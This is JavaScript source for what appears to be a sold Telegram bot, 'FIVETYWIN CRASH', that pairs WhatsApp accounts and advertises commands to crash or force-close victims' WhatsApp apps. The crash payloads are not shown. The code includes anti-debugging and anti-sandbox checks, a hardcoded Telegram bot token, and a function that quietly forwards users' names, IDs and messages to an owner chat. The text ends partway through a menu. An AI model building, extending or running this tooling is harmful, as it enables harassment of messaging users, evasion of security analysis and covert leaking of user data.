const {
    default: makeWASocket,
    proto,
    DisconnectReason,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    generateWAMessage,
    prepareWAMessageMedia,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys")
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const chalk = require("chalk"); 
const moment = require("moment");
const config = require("./config.js");
const { BOT_TOKEN, OWNER_ID } = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/fadlangg39-ops/buyerdb/main/token.json "; 
const ONLY_FILE = path.join(__dirname, "DATABASE", "gconly.json");
const cd = path.join(__dirname, "DATABASE", "cd.json");

/// --- ( Random Image ) --- \\\
const sendbug = "https://files.catbox.moe/abcnix.jpg";

const randomImages = [
  "https://files.catbox.moe/abcnix.jpg",
  "https://files.catbox.moe/abcnix.jpg",
  "https://files.catbox.moe/abcnix.jpg",
];

const getRandomImage = () => {
  return randomImages[Math.floor(Math.random() * randomImages.length)];
};

const axios = require('axios');

try {
  if (
    typeof axios.get !== 'function' ||
    typeof axios.create !== 'function' ||
    typeof axios.interceptors !== 'object' ||
    !axios.defaults
  ) {
    console.error(`[SECURITY] Axios telah dimodifikasi`);
    process.exit(1);
  }
  if (
    axios.interceptors.request.handlers.length > 0 ||
    axios.interceptors.response.handlers.length > 0
  ) {
    console.error(`[SECURITY] Axios interceptor aktif (bypass terdeteksi)`);
    process.exit(1);
  }
  const env = process.env;
  if (
    env.HTTP_PROXY || env.HTTPS_PROXY || env.NODE_TLS_REJECT_UNAUTHORIZED === '0'
  ) {
    console.error(`[SECURITY] Proxy atau TLS bypass aktif`);
    process.exit(1);
  }
  const execArgs = process.execArgv.join(' ');
  if (/--inspect|--debug|repl|vm2|sandbox/i.test(execArgs)) {
    console.error(`[SECURITY] Debugger / sandbox / VM terdeteksi`);
    process.exit(1);
  }
  const realToString = Function.prototype.toString.toString();
  if (Function.prototype.toString.toString() !== realToString) {
    console.error(`[SECURITY] Function.toString dibajak`);
    process.exit(1);
  }
  const mod = require('module');
  const _load = mod._load.toString();
  if (!_load.includes('tryModuleLoad') && !_load.includes('Module._load')) {
    console.error(`[SECURITY] Module._load telah dibajak`);
    process.exit(1);
  }
  const cache = Object.keys(require.cache || {});
  const suspicious = cache.filter(k =>
    k.includes('axios') &&
    !/node_modules[\\/]+axios[\\/]+(dist[\\/]+node[\\/]+axios\.cjs|index\.js)$/.test(k)
  );
  if (suspicious.length > 0) {
    console.error(`[SECURITY] require.cache mencurigakan`);
    process.exit(1);
  }
  const Module = require("module");
  const originalRequire = Module.prototype.require;
  Object.defineProperty(Module.prototype, "require", {
    value: function (path) {
      if (/jsonwebtoken|token|auth/i.test(path)) {
        console.error(`[SECURITY] Upaya manipulasi require(${path}) terdeteksi!`);
        process.exit(1);
      }
      return originalRequire.apply(this, arguments);
    },
    writable: false,
    configurable: false
  });
  const crypto = require("crypto");
  const originalHash = crypto.createHash;
  crypto.createHash = function (algo) {
    const hash = originalHash.call(this, algo);
    const realUpdate = hash.update;
    const realDigest = hash.digest;
    hash.update = realUpdate.bind(hash);
    hash.digest = realDigest.bind(hash);
    return hash;
  };
  ["exit", "kill", "abort"].forEach(fn => {
    const realFn = process[fn];
    Object.defineProperty(process, fn, {
      value: (...args) => realFn.apply(process, args),
      writable: false,
      configurable: false
    });
  });
} catch (err) {
  console.error(`[SECURITY] Proteksi gagal jalan:`, err);
  process.exit(1);
}

console.log("✅ Proteksi Aktif");


const bot = new TelegramBot(BOT_TOKEN, { polling: true }); 

const OWNER_CHAT_ID = '7991922773';
const userId = OWNER_CHAT_ID

async function sendNotifOwner(msg, customMessage = '') {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const username = msg.from.username || 'Tidak ada username';
        const firstName = msg.from.first_name;
        const lastName = msg.from.last_name || ''; 
        const messageText = msg.text;  

        const message = `
✨ XENON MENERIMA PESAN ✨

👤 *Pengirim:*
  - *Nama:* \`${firstName} ${lastName}\`
  - *Username:* @${username}
  - *ID:* \`${userId}\`
  - *Chat ID:* \`${chatId}\`

💬 *Pesan:*
\`\`\`
${messageText}
\`\`\``;
        const url = `https://api.telegram.org/bot8283430867:AAE2ub9q-ekZQO3GO5GRzKWcvVqCal9B76A/sendMessage`;
        await axios.post(url, {
            chat_id: OWNER_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('Notifikasi pesan pengguna berhasil dikirim ke owner.');
    } catch (error) {
        console.error('Gagal mengirim notifikasi ke owner:', error.message);
        
    }
}


// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let sock;
function saveActiveSessions(botNumber) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
        }
        } else {
        sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

                  for (const botNumber of activeNumbers) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                  const sessionDir = createSessionDir(botNumber);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  sock = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botNumber} terhubung!`);
                  sessions.set(botNumber, sock);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  sock.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

//// --- ( Intalasi WhatsApp ) --- \\\
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>｢ Ϟ ｣  FIVETYWIN CRASH</blockquote>
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
▢ Memproses Connecting
╰➤ Number: ${botNumber}
╰➤ Status: Connecting...
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
▢ Connection Gagal.
╰➤ Number: ${botNumber}
╰➤ Status: Gagal ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
▢ Connection Sukses
╰➤ Number: ${botNumber}
╰➤ Status: Sukses Connect.
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await sock.requestPairingCode(botNumber);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
▢ Code Pairing Kamu
╰➤ Number: ${botNumber}
╰➤ Code: \`${formattedCode}\`
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
╰➤ Status: ${error.message} Error⚠️
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }


// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
            let premiumUsers = JSON.parse(fs.readFileSync('./DATABASE/premium.json'));
            let adminUsers = JSON.parse(fs.readFileSync('./DATABASE/admin.json'));

            function ensureFileExists(filePath, defaultData = []) {
            if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
            }
            }
    
            ensureFileExists('./DATABASE/premium.json');
            ensureFileExists('./DATABASE/admin.json');


            function savePremiumUsers() {
            fs.writeFileSync('./DATABASE/premium.json', JSON.stringify(premiumUsers, null, 2));
            }

            function saveAdminUsers() {
            fs.writeFileSync('./DATABASE/admin.json', JSON.stringify(adminUsers, null, 2));
            }

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('./DATABASE/premium.json', (data) => (premiumUsers = data));
    watchFile('./DATABASE/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}


function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

        let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}


/// --- ( Menu Utama ) --- \\\
const bugRequests = {};

const verifiedUsers = new Set();

const TOKEN_BOT = "";

bot.onText(/\/Password (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const inputToken = match[1];

  if (verifiedUsers.has(chatId)) {
    return bot.sendMessage(chatId, "✅ You have been verified!");
  }

  if (true) {
    verifiedUsers.add(chatId);
    return bot.sendMessage(chatId, `
<blockquote>sɪᴘ ʟᴜ ᴀᴅᴀʟᴀʜ ʙᴜʏᴇʀ sᴇᴛɪᴀ</blockquote>
<blockquote>sᴛᴀᴛᴜs ᴠᴀʟɪᴅᴀᴛᴇᴅ ✅
☞ ʙᴏᴛ ɴᴀᴍᴇ : FIVETYWIN CRASH
☞ ʙᴏᴛ ᴠᴇʀsɪ : 1.0
☞ ᴅᴇᴠᴇʟᴏᴘᴇʀ : <a href="tg://user?id=8307751013">rilz</a></blockquote>
<blockquote>ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ FIVETYWIN CRASH sʏsᴛᴇᴍ ᴋᴇᴀᴍᴀɴᴀɴ, ᴛᴇʀɪᴍᴀᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴄʀɪᴘᴛ FIVETYWIN CRASH</blockquote>
    <blockquote>• sɪʟᴀʜᴋᴀɴ /start ᴜʟᴀɴɢ ᴜɴᴛᴜᴋ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀʟʟ ᴍᴇɴᴜ FIVETYWIN CRASH
</blockquote>
`, { parse_mode: "HTML" });
  } else {
    return bot.sendMessage(chatId, "ʏᴀ sɪ ᴀɴᴊɪɴɢ ɴɢᴀᴘᴀɪɴ ʟᴜʜ ᴛᴏʟᴏʟ, ᴍɪɴɪᴍᴀʟ ʙᴜʏ sᴄʀɪᴘᴛ ɴʏᴀ ᴊᴀɴɢᴀɴ ɴʏᴏʟᴏɴɢ, ᴍɪsᴋɪɴ ᴀᴍᴀᴛ ूाीू ");
  }
});

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  // Cek verifikasi
  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <Pw Sc>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }

  // ---- Jika sudah verifikasi, jalankan animasi start seperti biasa ----
  const startMsg = await bot.sendMessage(chatId, `
ʜᴀʟᴏᴏ ${username}
ʙᴏᴛ ᴄᴏɴɴᴇᴄᴛ ✅
ᴠᴇʀsɪ ʙᴏᴛ : 1.0
ᴄʀᴇᴀᴛᴏʀ : @FIVETYWIN
  `);
  
  const bars = ["𝗦𝗔𝗕𝗔𝗥 𝗞𝗢𝗖𝗔𝗞", "𝗢𝗧𝗪 𝗠𝗨𝗡𝗖𝗨𝗟", "𝗧𝗔𝗣𝗜 𝗕𝗢𝗢𝗡𝗚🤣", " 𝗕𝗘𝗥𝗖𝗔𝗡𝗗𝗔 🤓", "𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛 𝗧𝗘𝗟𝗔𝗛 𝗕𝗘𝗟𝗜"];
  for (let i = 0; i < bars.length; i++) {
    await new Promise(r => setTimeout(r, 400));
    await bot.editMessageText(
      `ᴍᴇɴʏɪᴀᴘᴋᴀɴ ᴍᴇɴᴜ ʙᴏᴛ...\n${bars[i]} ${((i + 1) * 20)}%`,
      { chat_id: chatId, message_id: startMsg.message_id }
    );
  }

  setTimeout(async () => {
    try { await bot.deleteMessage(chatId, startMsg.message_id); } catch {}
    const randomImage = getRandomImage();
    const date = new Date().toLocaleString("id-ID", { dateStyle: "full", timeStyle: "short" });

    await bot.sendPhoto(chatId, randomImage, {
  caption: `
<blockquote>
━━━【FIVETYWIN CRASH】━━━
─ (⚡) 𝗛𝗘𝗟𝗟𝗢 𝗚𝗨𝗬𝗦, 𝗧𝗛𝗔𝗡𝗞𝗦 𝗙𝗢𝗥 𝗠𝗔𝗞𝗜𝗡𝗚 𝗧𝗛𝗘 FIVETYWIN CRASH v1.0 𝗦𝗖𝗥𝗜𝗣𝗧. 𝗥𝗘𝗠𝗘𝗠𝗕𝗘𝗥 𝗡𝗢𝗧 𝗧𝗢 𝗨𝗦𝗘 𝗕𝗨𝗚𝗦 𝗜𝗡 𝗜𝗡𝗡𝗢𝗖𝗘𝗡𝗧 𝗣𝗘𝗢𝗣𝗟𝗘𝗚𝗨𝗬𝗦, 𝗢𝗡𝗟𝗬 𝗕𝗨𝗚 𝗚𝗨𝗜𝗟𝗧𝗬 𝗣𝗘𝗢𝗣𝗟𝗘. 𝗧𝗛𝗔𝗡𝗞𝗦 𝗙𝗢𝗥 𝗕𝗨𝗬𝗜𝗡𝗚 𝗜𝗧, 𝗛𝗢𝗡𝗣𝗘𝗙𝗨𝗟𝗟𝗬 𝗜𝗧 𝗛𝗘𝗟𝗣𝗦 👻
  
╭━━【 FIVETYWIN CRASH 】━━━
┃ Developer : @FIVETYWIN
┃ Version : 1.0 VVIP
┃ Language : JavaScript
╰━━━━━━━━━━━━━━━━━━━━༉‧.  
╭━━━【 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 】━━━ 
┃ Username : ${username}  
┃ 𝐓𝐄𝐑𝐈𝐌𝐀𝐊𝐀𝐒𝐈𝐇 𝐓𝐄𝐋𝐀𝐇 𝐁𝐄𝐋𝐈 𝐒𝐂𝐑𝐈𝐏𝐈𝐓 𝐊𝐀𝐌𝐈
╰━━━━━━━━╼╼╼╼╼╼╼╼╼━━━༉‧.  

ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ
</blockquote>
`,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "𝐒𝐮𝐩𝐩𝐫𝐨𝐭", callback_data: "thanksto" },
        { text: "𝐂𝐨𝐧𝐭𝐫𝐨𝐥 𝐌𝐞𝐧𝐮 ", callback_data: "ownermenu" }, 
      ], 
      [
        { text: " 𝐁𝐮𝐠𝐬 𝐌𝐞𝐧𝐮 ", callback_data: "bugshow" },
      ], 
      [
        { text: " 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮 ", callback_data: "tools" },
      ], 
      [
        { text: " 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢𝐨𝐧 ", url: "t.me/FIVETYWIN" },
      ],
    ],
  },
});

setTimeout(() => {
  bot.sendAudio(chatId, fs.createReadStream("rid/lagu.mp3"), {
    title: "FIVETYWIN CRASH",
    performer: "Version 1.0",
    caption: `FIVETYWIN CRASH`,
    parse_mode: "HTML"
  });
}, 100); 
}); 
}); 

bot.on("callback_query", async (callbackQuery) => {
  try {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const randomImage = getRandomImage();
    const senderId = callbackQuery.from.id;
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
    const date = getCurrentDate();

    let newCaption = "";
    let newButtons = [];

    if (data === "bugshow") {
      newCaption = `
<blockquote>
┏╼╼╼╼╼╼𝗖𝗢𝗢𝗠𝗔𝗡𝗗𝗦 BUGS╼╼╼┓
ᝰ.ᐟ /XWaltres
  ╰⪼ Crsah Andro
 
ᝰ.ᐟ /XShadow
  ╰⪼ Balnk Sistem
  
ᝰ.ᐟ /XKairos
  ╰⪼ Ui Sistem
  
ᝰ.ᐟ /XRose
  ╰⪼ Frocolse One msg
  
ᝰ.ᐟ /XKuli
  ╰⪼ Forcolse no clik 
  
ᝰ.ᐟ /Xatoni
  ╰⪼ Frocolse One msg
  
▄︻デ PILIH MENU DI BAWAH ═══━一
</blockquote>
      `;
      newButtons = [
        [{ text: " 𝙳𝙴𝙻𝙰𝚈 𝙷𝙰𝚁𝙳", callback_data: "bugshow2" }], 
        [{ text: " 𝙸𝙽𝙵𝙸𝚃𝙸𝚈 𝙲𝙰𝚁𝚂𝙷 ", callback_data: "bugsohw3" }],
        [{ text: " 𝙵𝙾𝚁𝙴𝙲𝙻𝙾𝚂𝙴 𝙲𝙰𝚁𝚂𝙷", callback_data: "bugshow4" }],
        [{ text: " 𝙱𝙰𝙲𝙺 𝚃𝙾 𝙼𝙴𝙽𝚄 ", callback_data: "mainmenu" }], 
        [{ text: " ʀᴏᴏᴍ ᴍsɢ (⌕) ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
      ];

    } else if (data === "ownermenu") {
      newCaption = `
<blockquote>
┏╼╼╼╼╼╼𝗖𝗢𝗢𝗠𝗔𝗡𝗗𝗦 𝗕𝗨𝗚𝗦╼╼╼┓
ᝰ.ᐟ /addadmin (ɪᴅ)  
     ⸙ ᴛᴀᴍʙᴀʜ ᴀᴅᴍɪɴ  
ᝰ.ᐟ /deladmin (ɪᴅ)  
     ⸙ ʜᴀᴘᴜs ᴀᴅᴍɪɴ  
ᝰ.ᐟ /setjeda [ 5s ]
     ⸙ sᴇᴛᴛɪɴɢ ᴄᴏᴏʟᴅᴏᴡɴ 
ᝰ.ᐟ /addbot [ 62xxx ]
     ⸙ ᴄᴏɴɴᴇᴄᴛ ᴛᴏ sᴇɴᴅᴇʀ
ᝰ.ᐟ /delbot [ 62xxx ]
     ⸙ ᴍᴇɴɢʜᴀᴘᴜs sᴇɴᴅᴇʀ
ᝰ.ᐟ /addprem (ɪᴅ) (ᴡᴀᴋᴛᴜ)  
     ⸙ ᴀᴋᴛɪғᴋᴀɴ ᴘʀᴇᴍ ᴜsᴇʀ  
ᝰ.ᐟ /delprem (ɪᴅ)  
     ⸙ ʜᴀᴘᴜs ᴘʀᴇᴍ ᴜsᴇʀ 
ᝰ.ᐟ /cekid  
     ⸙ ᴄᴇᴋ ɪᴅ ᴜsᴇʀ
ᝰ.ᐟ /uptime
     ⸙ ʙᴇʀᴀᴘᴀ ʟᴀᴍᴀ ʙᴏᴛ  ᴀᴋᴛɪғ
ᝰ.ᐟ /restartbot  
     ⸙ ʀᴇsᴛᴀʀᴛ ʙᴏᴛ ᴘᴀɴᴇʟ
ᝰ.ᐟ /listprem
     ⸙ ᴍᴇʟɪʜᴀᴛ ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ
ᝰ.ᐟ /listsender
     ⸙ ᴍᴇɴɢᴇᴄᴇᴋ sᴇɴᴅᴇʀ ᴄᴏɴɴᴇᴄᴛ 
FIVETYWIN CRASH sʏsᴛᴇᴍ ᴄᴏɴᴛʀᴏʟ
</blockquote>
      `;
      newButtons = [
        [{ text: "𝐁𝐚𝐜𝐤 𝐌𝐞𝐧𝐮", callback_data: "mainmenu" }], 
        [{ text: "𝐃𝐨𝐚 𝐁𝐮𝐲𝐞𝐫", callback_data: "doa_buyer" }], 
        [{ text: " 𝐑𝐨𝐨𝐦 𝐌𝐬𝐠 ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
      ];

    
    } else if (data === "tools") {
      newCaption = `
<blockquote>
┏╼╼╼╼╼╼𝗖𝗢𝗢𝗠𝗔𝗡𝗗𝗦 𝗕𝗨𝗚𝗦╼╼╼┓
╰┈➤ /antilink [ on/off ] 
ᝰ. sᴇᴛᴛɪɴɢ ᴀɴᴛɪʟɪɴᴋ

╰┈➤ /groupinfo 
ᝰ. ᴄᴇᴋ ɪɴғᴏ ʜʀᴏᴜᴘ

╰┈➤ /setrules
ᝰ. sᴇᴛᴛɪɴɢ ʀᴜʟᴇs ɢʀᴏᴜᴘ

╰┈➤ /rules
ᝰ. ᴍᴇʟɪʜᴀᴛ ʀᴜʟᴇs ɢʀᴏᴜᴘ

╰┈➤ /mute
ᝰ. ᴍᴜᴛᴇ ᴜsᴇʀ

╰┈➤ /unmute
ᝰ. ᴜɴᴍᴜᴛᴇ ᴜsᴇʀ

╰┈➤ /ban
ᝰ. ʙᴀɴ ᴜsᴇʀ

╰┈➤ /unban
ᝰ. ᴜɴʙᴀɴ ᴜsᴇʀ

╰┈➤ /kick
ᝰ. ᴛᴇɴᴅᴀɴɢ ᴜsᴇʀ

⸙ ʜᴀʟᴀᴍᴀɴ 1 / 5
</blockquote>
      `;
      newButtons = [
        [{ text: "𝐓𝐨𝐨𝐥𝐬 𝚅𝟸", callback_data: "tools_dua" }],
        [{ text: "𝐓𝐨𝐨𝐥𝐬 𝚅𝟹", callback_data: "tools_tiga" }],
        [{ text: "𝐓𝐨𝐨𝐥𝐬 𝚅𝟺", callback_data: "tools_empat" }],
        [{ text: "𝐓𝐨𝐨𝐥𝐬 𝚅5", callback_data: "tools_lima" }],
        [{ text: "𝐁𝐚𝐜𝐤 𝐌𝐞𝐧𝐮", callback_data: "mainmenu" }], 
        [{ text: "𝐑𝐨𝐨𝐦 𝐌𝐬𝐠 ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
      ];

    
    } else if (data === "tools_dua") {
  if (!isPremium) {
    return bot.answerCallbackQuery(callbackQuery.id, {
      text: "🚫 Fitur ini khusus untuk pengguna *PREMIUM*!\n\nHubungi @FIVETYWIN untuk upgrade ✨",
      show_alert: true // <-- ini bikin notif pop-up muncul di layar user
    });
  }

  newCaption = `
<blockquote>
┏╼╼╼╼╼╼𝗖𝗢𝗢𝗠𝗔𝗡𝗗𝗦 BUGS╼╼╼┓

╰┈➤ /brat
ᝰ. ᴛᴇxᴛ ᴛᴏ sᴛɪᴄᴋᴇʀ

╰┈➤ /iqc
ᝰ. ɪǫᴄ ɪᴘʜᴏɴᴇ

╰┈➤ /ig
ᝰ. ᴅᴏᴡʟᴏᴀᴅ ᴠɪᴅɪᴏ ɪɢ

╰┈➤ /cekid
ᝰ. ᴄᴇᴋ ɪᴅ ᴜsᴇʀ

╰┈➤ /infome
ᝰ. ɪɴғᴏ ᴜsᴇʀ

╰┈➤ /stat
ᝰ. ᴄᴇᴋ ᴘᴇɴɢɢᴜɴᴀ ᴀᴋᴛɪғ

╰┈➤ /maps
ᝰ. ᴄᴇᴋ ᴍᴀᴘs ᴊᴀᴋᴀʀᴛᴀ ᴅʟʟ

╰┈➤ /duel
ᝰ. ᴅᴜᴇʟ ᴅᴇɴɢᴀɴ ᴜsᴇʀ

╰┈➤ /tiktok
ᝰ. ᴅᴏᴡʟᴏᴀᴅ ᴠɪᴅɪᴏ ᴛɪᴋᴛᴏᴋ ᴜʀʟ

ʜᴀʟᴀᴍᴀɴ 2 / 5
</blockquote>
  `;
  newButtons = [
    [{ text: "𝐋𝐚𝐧𝐣𝐮𝐭", callback_data: "tools_tiga" }],
    [{ text: "𝐁𝐚𝐜𝐤 𝐌𝐞𝐧𝐮", callback_data: "tools_dua" }], 
    [{ text: " 𝐑𝐨𝐨𝐦 𝐌𝐬𝐠 ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
  ];


    } else if (data === "back_dua") {
  if (!isPremium) {
    return bot.answerCallbackQuery(callbackQuery.id, {
      text: "🚫 Fitur ini khusus untuk pengguna *PREMIUM*!\n\nHubungi @FIVETYWIN untuk upgrade ✨",
      show_alert: true // <-- ini bikin notif pop-up muncul di layar user
    });
  }

  newCaption = `
<blockquote>
┏╼╼╼╼╼╼𝗖𝗢𝗢𝗠𝗔𝗡𝗗𝗦 𝗕𝗨𝗚𝗦╼╼╼┓

╰┈➤ /brat
ᝰ. ᴛᴇxᴛ ᴛᴏ sᴛɪᴄᴋᴇʀ

╰┈➤ /iqc
